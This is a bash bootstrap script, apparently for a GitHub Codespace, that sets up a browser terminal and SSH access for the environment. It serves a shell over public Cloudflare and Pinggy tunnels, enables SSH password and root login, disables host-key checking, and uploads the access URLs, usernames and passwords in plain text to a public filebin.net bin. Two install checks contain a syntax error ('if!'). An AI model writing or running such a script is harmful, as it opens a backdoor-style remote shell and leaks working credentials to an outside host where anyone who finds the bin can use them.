#!/bin/bash
# Codespace browser-terminal + SSH bootstrap.

BIN="673avtsbo7ni8acw"
WEB_PORT="7681"
WEB_REPORT="/tmp/web-terminal.txt"
SSH_REPORT="/tmp/ssh-terminal.txt"
TTYD_LOG="/tmp/ttyd.log"
CLOUDFLARED_LOG="/tmp/cloudflared.log"
PINGGY_LOG="/tmp/pinggy.log"
WEB_USERNAME="monkey"

exec > >(tee -a /tmp/startup.log) 2>&1
echo "[startup] Beginning bootstrap at $(date -u)"

if command -v openssl >/dev/null 2>&1; then
  WEB_PASSWORD="$(openssl rand -hex 24)"
else
  WEB_PASSWORD="$(od -An -N24 -tx1 /dev/urandom | tr -d ' \n')"
fi

# --- install ttyd / cloudflared (your original part) ---
if! command -v ttyd >/dev/null 2>&1; then
  ARCH="$(uname -m)"
  case "$ARCH" in
    x86_64) TTYD_ASSET="ttyd.x86_64" ;;
    aarch64|arm64) TTYD_ASSET="ttyd.aarch64" ;;
    *) TTYD_ASSET="" ;;
  esac
  if [ -n "$TTYD_ASSET" ] && command -v curl >/dev/null 2>&1; then
    echo "[web-terminal] Installing ttyd..."
    curl --fail -L "https://github.com/tsl0922/ttyd/releases/latest/download/$TTYD_ASSET" -o /tmp/ttyd &&
      chmod +x /tmp/ttyd && sudo mv /tmp/ttyd /usr/local/bin/ttyd || true
  fi
fi

if! command -v cloudflared >/dev/null 2>&1; then
  ARCH="$(uname -m)"
  case "$ARCH" in
    x86_64) CF_ASSET="cloudflared-linux-amd64" ;;
    aarch64|arm64) CF_ASSET="cloudflared-linux-arm64" ;;
    *) CF_ASSET="" ;;
  esac
  if [ -n "$CF_ASSET" ] && command -v curl >/dev/null 2>&1; then
    echo "[web-terminal] Installing cloudflared..."
    curl --fail -L "https://github.com/cloudflare/cloudflared/releases/latest/download/$CF_ASSET" -o /tmp/cloudflared &&
      chmod +x /tmp/cloudflared && sudo mv /tmp/cloudflared /usr/local/bin/cloudflared || true
  fi
fi

WEB_URL=""

if command -v ttyd >/dev/null 2>&1 && command -v cloudflared >/dev/null 2>&1; then
  echo "[web-terminal] Starting ttyd on localhost:$WEB_PORT..."
  nohup ttyd -W -p "$WEB_PORT" -c "$WEB_USERNAME:$WEB_PASSWORD" bash >"$TTYD_LOG" 2>&1 &

  for attempt in $(seq 1 15); do
    (echo >/dev/tcp/127.0.0.1/$WEB_PORT) >/dev/null 2>&1 && break
    sleep 1
  done

  if (echo >/dev/tcp/127.0.0.1/$WEB_PORT) >/dev/null 2>&1; then
    echo "[web-terminal] Starting Cloudflare Quick Tunnel..."
    nohup cloudflared tunnel --no-autoupdate --url "http://127.0.0.1:$WEB_PORT" >"$CLOUDFLARED_LOG" 2>&1 &
    for attempt in $(seq 1 30); do
      WEB_URL="$(grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' "$CLOUDFLARED_LOG" | head -n 1 || true)"
      [ -n "$WEB_URL" ] && break
      sleep 2
    done
  fi
fi

if [ -n "$WEB_URL" ]; then
  cat > "$WEB_REPORT" <<EOF
=== TEMPORARY CODESPACE WEB TERMINAL ===
URL: $WEB_URL
Username: $WEB_USERNAME
Password: $WEB_PASSWORD
EOF
  curl --fail --silent --data-binary "@$WEB_REPORT" "https://filebin.net/$BIN/web-terminal.txt" || true
  echo "[web-terminal] Uploaded: $WEB_URL"
else
  echo "[web-terminal] FAILED"
fi

# --- NEW: PINGGY SSH FOR TERMIUS ---
echo "[ssh] Starting Pinggy SSH tunnel..."

# enable password auth for your current codespace user
CURRENT_USER=$(whoami)
echo "$CURRENT_USER:$WEB_PASSWORD" | sudo chpasswd
sudo sed -i 's/#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo service ssh start 2>/dev/null || sudo /usr/sbin/sshd || true

# start pinggy tcp tunnel for port 22
# -R0 = random public port
nohup ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:localhost:22 a.pinggy.io >"$PINGGY_LOG" 2>&1 &

SSH_URL=""
for attempt in $(seq 1 30); do
  # pinggy outputs like: tcp://a.pinggy.io:xxxxx or xxxx-xxx.a.pinggy.io:xxxxx
  SSH_URL="$(grep -Eo '[a-z0-9.-]+\.a\.pinggy\.io:[0-9]+' "$PINGGY_LOG" | head -n 1 || true)"
  [ -n "$SSH_URL" ] && break
  sleep 2
done

if [ -n "$SSH_URL" ]; then
  PINGGY_HOST=$(echo $SSH_URL | cut -d: -f1)
  PINGGY_PORT=$(echo $SSH_URL | cut -d: -f2)
  cat > "$SSH_REPORT" <<EOF
=== TEMPORARY CODESPACE SSH (Termius) ===
Host: $PINGGY_HOST
Port: $PINGGY_PORT
Username: $CURRENT_USER
Password: $WEB_PASSWORD

Command: ssh -p $PINGGY_PORT $CURRENT_USER@$PINGGY_HOST

DELETE THIS FILEBIN ITEM AFTER RETRIEVING.
EOF
  echo "[ssh] Pinggy: $SSH_URL"
  curl --fail --silent --data-binary "@$SSH_REPORT" "https://filebin.net/$BIN/ssh-terminal.txt" || true
  echo "[ssh] Uploaded to filebin.net/$BIN/ssh-terminal.txt"
else
  echo "[ssh] FAILED TO CREATE PINGGY TUNNEL"
  cat "$PINGGY_LOG"
fi

echo "[startup] Finished at $(date -u)"
